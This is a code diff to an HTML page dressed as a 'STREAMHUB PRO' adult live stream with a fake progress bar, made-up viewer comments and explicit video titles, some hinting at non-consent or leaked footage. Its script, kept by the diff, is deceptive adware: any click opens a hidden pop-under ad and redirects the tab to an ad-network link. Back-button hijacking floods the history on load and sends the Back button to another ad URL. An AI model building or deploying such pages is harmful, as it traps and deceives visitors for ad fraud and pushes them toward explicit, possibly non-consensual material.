@@ -159,30 +159,20 @@
             text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
-        /* FAKE BUFFERING OVERLAY */
-        .fake-loader {
-            display: none;
+        /* PROGRESS BAR BAR STYLES */
+        .progress-bar-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
             position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.85);
-            z-index: 50;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
+            bottom: 0;
+            left: 0;
+            cursor: pointer;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255,255,255,0.2);
-            border-top: 5px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 12px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .progress-bar-fill {
+            width: 35%;
+            height: 100%;
+            background: #ff0000;
         }
 
         /* VIDEO META */
@@ -224,6 +214,7 @@
             background: #121212;
             border-top: 1px solid #222;
             padding: 10px 12px;
+            cursor: pointer;
         }
         .chat-header {
             font-size: 12px;
@@ -238,8 +229,8 @@
             display: flex;
             flex-direction: column;
             gap: 8px;
-            max-height: 140px;
-            overflow: hidden;
+            max-height: 200px;
+            overflow-y: auto;
         }
         .comment-item {
             display: flex;
@@ -249,28 +240,20 @@
             background: #1a1a1a;
             padding: 6px 8px;
             border-radius: 4px;
-            animation: fadeIn 0.3s ease;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .c-avatar-icon {
-            width: 24px;
-            height: 24px;
+        .c-avatar {
+            width: 26px;
+            height: 26px;
             border-radius: 50%;
+            background: #cc0000;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 11px;
+            font-size: 10px;
+            font-weight: bold;
             color: #fff;
             flex-shrink: 0;
         }
-        .c-avatar-icon.hot { background: #e91e63; }
-        .c-avatar-icon.fire { background: #ff5722; }
-        .c-avatar-icon.vip { background: #ffc107; color: #000; }
-        .c-avatar-icon.cam { background: #9c27b0; }
-        
         .c-name {
             font-weight: 600;
             color: #bbb;
@@ -349,7 +332,6 @@
 </head>
 <body>
 
-    <!-- HEADER -->
     <div class="header">
         <div class="logo">
             <i class="fas fa-play-circle"></i> STREAMHUB <span>PRO</span>
@@ -359,19 +341,11 @@
         </div>
     </div>
 
-    <!-- MAIN CONTAINER -->
     <div class="container">
-        <!-- MAIN PLAYER AREA -->
         <div class="main-content">
-            <div class="player-wrapper action-trigger">
+            <div class="player-wrapper" id="videoPlayer">
                 <img id="mainGif" src="" alt="Stream Preview">
                 
-                <!-- FAKE BUFFERING OVERLAY -->
-                <div class="fake-loader" id="fakeLoader">
-                    <div class="spinner"></div>
-                    <div style="font-size:14px; font-weight:bold;">Connecting to HD Stream...</div>
-                </div>
-
                 <div class="overlay" id="playerOverlay">
                     <div class="top-info">
                         <span class="quality-badge"><i class="fas fa-check-circle"></i> 4K ULTRA HD</span>
@@ -385,6 +359,10 @@
                     </div>
                     <div></div>
                 </div>
+
+                <div class="progress-bar-container" id="progressSlider">
+                    <div class="progress-bar-fill"></div>
+                </div>
             </div>
 
             <div class="video-info">
@@ -392,177 +370,172 @@
                 <div class="video-stats">
                     <div>Started streaming 4 minutes ago</div>
                     <div class="action-btns">
-                        <div class="action-btn action-trigger"><i class="fas fa-thumbs-up"></i> 142K</div>
-                        <div class="action-btn action-trigger"><i class="fas fa-share"></i> Share</div>
+                        <div class="action-btn"><i class="fas fa-thumbs-up"></i> 142K</div>
+                        <div class="action-btn"><i class="fas fa-share"></i> Share</div>
                     </div>
                 </div>
             </div>
 
-            <!-- LIVE CHAT -->
-            <div class="live-chat-box">
+            <div class="live-chat-box" id="commentsBox">
                 <div class="chat-header">
                     <span>Top Live Comments</span>
                     <span style="color: #ff0000;"><i class="fas fa-circle" style="font-size: 8px;"></i> Live Chat</span>
                 </div>
-                <div class="chat-messages" id="chatStream">
-                    <!-- Dynamic Comments -->
+                <div class="chat-messages" id="commentsList">
                 </div>
             </div>
         </div>
 
-        <!-- SIDEBAR -->
         <div class="sidebar">
             <div class="sidebar-title">Recommended Streams</div>
             <div id="suggestedList">
-                <!-- Dynamic Suggested Videos -->
             </div>
         </div>
     </div>
 
-    <!-- JAVASCRIPT LOGIC -->
-   <script>
-    (function() {
-        // ════════════════════════════════════════════════════════════
-        // LINKS SETTINGS
-        // ════════════════════════════════════════════════════════════
-        const DIRECT_LINK_MAIN = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
-        const REDIRECT_LINK_1  = 'https://honmia.com/4/ec5866dcb0471f77902fb47c83357279';
-        const BACK_HIJACK_LINK = 'https://www.profitableratecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
+    <script>
+        (function() {
+            // ════════════════════════════════════════════════════════════
+            // LINKS SETTINGS
+            // ════════════════════════════════════════════════════════════
+            const DIRECT_LINK_MAIN = 'https://www.profitableratecpmnetwork.com/awn1xp0h21?key=26baf4fd741afacd351dde20ac85c8e5'; 
+            const REDIRECT_LINK_1  = 'https://honmia.com/4/ec5866dcb0471f77902fb47c83357279';
+            const BACK_HIJACK_LINK = 'https://www.profitableratecpmnetwork.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c';
 
-        const videoPool = [
-            { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
-            { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
-            { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
-            { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
-            { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
-            { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
-            { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
-            { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
-            { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
-            { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
-            { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
-        ];
+            const videoPool = [
+                { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M', time: '12:05' },
+                { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M', time: '15:40' },
+                { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend hard in bedroom', views: '3.1M', time: '09:12' },
+                { src: 'IMG_0198.GIF', title: 'Horny stepmother caught and forced to extreme blowout', views: '2.5M', time: '10:14' },
+                { src: 'IMG_0199.GIF', title: 'College teen girls sharing massive tools together tape', views: '1.9M', time: '14:22' },
+                { src: 'IMG_0200.GIF', title: 'Deepthroat rehearsal in dressing room leak compilation', views: '3.4M', time: '11:05' },
+                { src: 'IMG_0201.GIF', title: 'Tight amateur stepsister creamed while sneaking out', views: '2.1M', time: '08:45' },
+                { src: 'IMG_0202.GIF', title: 'Wet pov rough ride on huge black cock till she shakes', views: '1.6M', time: '13:50' },
+                { src: 'IMG_0203.GIF', title: 'Horny secretary desktop pounding session uncut version', views: '2.8M', time: '16:15' },
+                { src: 'IMG_0204.GIF', title: 'Slutty girlfriend begs for aggressive back door action', views: '3.0M', time: '12:30' },
+                { src: 'IMG_0205.GIF', title: 'Cum swallowing compilation from top verified premiums', views: '2.3M', time: '10:55' }
+            ];
 
-        const commentsPool = [
-            { avatar: 'JD', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥', time: '2 mins ago' },
-            { avatar: 'NS', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯', time: '1 min ago' },
-            { avatar: 'K9', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!', time: '4 mins ago' },
-            { avatar: 'A2', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆', time: '3 mins ago' },
-            { avatar: 'LX', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥', time: '5 mins ago' },
-            { avatar: 'MR', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦', time: '30s ago' },
-            { avatar: 'BH', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...', time: '6 mins ago' },
-            { avatar: 'ST', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌', time: '7 mins ago' },
-            { avatar: 'P6', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!', time: '8 mins ago' },
-            { avatar: 'V2', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!', time: '10 mins ago' },
-            { avatar: 'X3', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅', time: '11 mins ago' },
-            { avatar: 'DK', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!', time: '12 mins ago' }
-        ];
+            const commentsPool = [
+                { avatar: 'JD', name: 'John D.', text: 'Wow, can\'t believe this is unrated version! 😱🔥', time: '2 mins ago' },
+                { avatar: 'NS', name: 'Naughty_Sam', text: 'Damn, she is taking it so deep! Absolute perfection 🤤💯', time: '1 min ago' },
+                { avatar: 'K9', name: 'Kevin99', text: 'The full video link is amazing, totally worth clicking guys!', time: '4 mins ago' },
+                { avatar: 'A2', name: 'Alex_Adult', text: 'Her body is insane! Love how hard he is pumping her 🍒🍆', time: '3 mins ago' },
+                { avatar: 'LX', name: 'Lisa X', text: 'Oh my god, those positions are wild. Best scene ever! 🔥', time: '5 mins ago' },
+                { avatar: 'MR', name: 'Mike_Rod', text: 'That creampie at the end was completely out of this world! 💦💦', time: '30s ago' },
+                { avatar: 'BH', name: 'Babby_Hot', text: 'She screams so loud, I can listen to this all night long...', time: '6 mins ago' },
+                { avatar: 'ST', name: 'Sins_Fan', text: 'This girl is a beast! Pure hardcore action right here 😳👌', time: '7 mins ago' },
+                { avatar: 'P6', name: 'PornKing69', text: 'That big cock completely stretched her out. Insane wetness!', time: '8 mins ago' },
+                { avatar: 'V2', name: 'Vixen_Lover', text: 'My favorite amateur couple, glad I caught this premiere live!', time: '10 mins ago' },
+                { avatar: 'X3', name: 'XXX_Hunter', text: 'Holy shit! The way she rides that huge tool is gorgeous 👅', time: '11 mins ago' },
+                { avatar: 'DK', name: 'Dirty_Karl', text: 'Absolutely brutal sex, she loves every single inch of it!', time: '12 mins ago' }
+            ];
 
-        const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
-        document.getElementById('mainGif').src = mainVideo.src;
-        document.getElementById('mainTitle').textContent = mainVideo.title;
+            const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
+            document.getElementById('mainGif').src = mainVideo.src;
+            document.getElementById('mainTitle').textContent = mainVideo.title;
 
-        // Load Comments
-        let commentsHtml = '';
-        commentsPool.forEach(c => {
-            commentsHtml += `
-            <div class="comment-item">
-                <div class="c-avatar">${c.avatar}</div>
-                <div class="c-body">
-                    <div class="c-name">${c.name} <span>${c.time}</span></div>
-                    <div class="c-text">${c.text}</div>
-                </div>
-            </div>`;
-        });
-        document.getElementById('commentsList').innerHTML = commentsHtml;
-
-        // Load Sidebar Recommendations
-        let sidebarHtml = '';
-        videoPool.forEach((item) => {
-            if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
-                sidebarHtml += `
-                <div class="sidebar-item suggested-video-item">
-                    <div class="thumb">
-                        <img src="${item.src}" loading="lazy" />
-                        <div class="duration">${item.time}</div>
-                    </div>
-                    <div class="info">
-                        <div class="title">${item.title}</div>
-                        <div class="meta">${item.views} views • Recommendation</div>
+            // Load Comments
+            let commentsHtml = '';
+            commentsPool.forEach(c => {
+                commentsHtml += `
+                <div class="comment-item">
+                    <div class="c-avatar">${c.avatar}</div>
+                    <div class="c-body">
+                        <div class="c-name">${c.name} <span>${c.time}</span></div>
+                        <div class="c-text">${c.text}</div>
                     </div>
                 </div>`;
-            }
-        });
-        document.getElementById('suggestedList').innerHTML = sidebarHtml;
+            });
+            document.getElementById('commentsList').innerHTML = commentsHtml;
 
-        // ════════════════════════════════════════════════════════════
-        // ADVANCED POP-UNDER & TAB-UNDER REDIRECT LOGIC
-        // ════════════════════════════════════════════════════════════
-        let isRedirecting = false;
+            // Load Sidebar Recommendations
+            let sidebarHtml = '';
+            videoPool.forEach((item) => {
+                if(item.title !== mainVideo.title || item.src !== mainVideo.src) {
+                    sidebarHtml += `
+                    <div class="sidebar-item suggested-video-item">
+                        <div class="thumb">
+                            <img src="${item.src}" loading="lazy" />
+                            <div class="duration">${item.time}</div>
+                        </div>
+                        <div class="info">
+                            <div class="title">${item.title}</div>
+                            <div class="meta">${item.views} views • Recommendation</div>
+                        </div>
+                    </div>`;
+                }
+            });
+            document.getElementById('suggestedList').innerHTML = sidebarHtml;
 
-        function triggerPopUnder() {
-            if (isRedirecting) return;
-            isRedirecting = true;
+            // ════════════════════════════════════════════════════════════
+            // ADVANCED POP-UNDER & TAB-UNDER REDIRECT LOGIC
+            // ════════════════════════════════════════════════════════════
+            let isRedirecting = false;
 
-            // ব্যাক বাটন হাইজ্যাকিং এর হিস্ট্রি তৈরি করে রাখা
-            pushStateHistory();
+            function triggerPopUnder() {
+                if (isRedirecting) return;
+                isRedirecting = true;
 
-            // ১. অ্যাডস লিঙ্ক নতুন ট্যাবে বা পপ-আন্ডার উইন্ডোতে ওপেন করা
-            let popWindow = window.open(REDIRECT_LINK_1, '_blank');
-            
-            if (popWindow) {
-                try {
-                    // নতুন উইন্ডো থেকে ফোকাস সরিয়ে মেইন পেজে রাখা (Pop-under Trick)
-                    popWindow.blur();
-                    window.focus();
-                } catch(e) {}
-            }
-
-            // ২. ২০০ মিলি-সেকেন্ডের হালকা বাফারিং ডিলে দিয়ে মেইন ট্যাবকে অফার লিঙ্কে নিয়ে যাওয়া
-            setTimeout(function() {
-                window.location.href = DIRECT_LINK_MAIN;
-            }, 200);
-        }
-
-        // পেজের যে কোনো জায়গায় ক্লিক করলেই ট্রিপল-অ্যাকশন ট্রিগার হবে
-        document.addEventListener('click', function(e) {
-            triggerPopUnder();
-        });
-
-        // ════════════════════════════════════════════════════════════
-        // ENHANCED BACK-BUTTON HIJACKING
-        // ════════════════════════════════════════════════════════════
-        let hijackInitialized = false;
-
-        function pushStateHistory() {
-            for (let i = 0; i < 15; i++) {
-                window.history.pushState({ page: i }, document.title, window.location.href);
-            }
-        }
-
-        function setupHijack() {
-            if (!hijackInitialized) {
+                // ব্যাক বাটন হাইজ্যাকিং এর হিস্ট্রি তৈরি করে রাখা
                 pushStateHistory();
-                hijackInitialized = true;
+
+                // ১. অ্যাডস লিঙ্ক নতুন ট্যাবে বা পপ-আন্ডার উইন্ডোতে ওপেন করা
+                let popWindow = window.open(REDIRECT_LINK_1, '_blank');
+                
+                if (popWindow) {
+                    try {
+                        // নতুন উইন্ডো থেকে ফোকাস সরিয়ে মেইন পেজে রাখা (Pop-under Trick)
+                        popWindow.blur();
+                        window.focus();
+                    } catch(e) {}
+                }
+
+                // ২. ২০০ মিলি-সেকেন্ডের হালকা বাফারিং ডিলে দিয়ে মেইন ট্যাবকে অফার লিঙ্কে নিয়ে যাওয়া
+                setTimeout(function() {
+                    window.location.href = DIRECT_LINK_MAIN;
+                }, 200);
             }
-        }
 
-        // প্রথম পেজ লোডেই হিস্ট্রি পুশ
-        pushStateHistory();
+            // পেজের যে কোনো জায়গায় ক্লিক করলেই ট্রিপল-অ্যাকশন ট্রিগার হবে
+            document.addEventListener('click', function(e) {
+                triggerPopUnder();
+            });
 
-        // ইউজারের কোনো ইন্টারঅ্যাকশন পেলেই হিস্ট্রি ট্র্যাপ শক্তিশালী করা
-        const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
-        userEvents.forEach(evt => {
-            window.addEventListener(evt, setupHijack, { passive: true });
-        });
+            // ════════════════════════════════════════════════════════════
+            // ENHANCED BACK-BUTTON HIJACKING
+            // ════════════════════════════════════════════════════════════
+            let hijackInitialized = false;
 
-        // ব্যাক বাটন চাপলেই হাইজ্যাক লিঙ্কে রিডাইরেক্ট হবে
-        window.addEventListener('popstate', function (event) {
+            function pushStateHistory() {
+                for (let i = 0; i < 15; i++) {
+                    window.history.pushState({ page: i }, document.title, window.location.href);
+                }
+            }
+
+            function setupHijack() {
+                if (!hijackInitialized) {
+                    pushStateHistory();
+                    hijackInitialized = true;
+                }
+            }
+
+            // প্রথম পেজ লোডেই হিস্ট্রি পুশ
             pushStateHistory();
-                window.location.href = BACK_HIJACK_LINK;
-        });
 
-    })();
-</script>
+            // ইউজারের কোনো ইন্টারঅ্যাকশন পেলেই হিস্ট্রি ট্র্যাপ শক্তিশালী করা
+            const userEvents = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
+            userEvents.forEach(evt => {
+                window.addEventListener(evt, setupHijack, { passive: true });
+            });
+
+            // ব্যাক বাটন চাপলেই হাইজ্যাক লিঙ্কে রিডাইরেক্ট হবে
+            window.addEventListener('popstate', function (event) {
+                pushStateHistory();
+                window.location.href = BACK_HIJACK_LINK;
+            });
+
+        })();
+    </script>
 </body>
 </html>
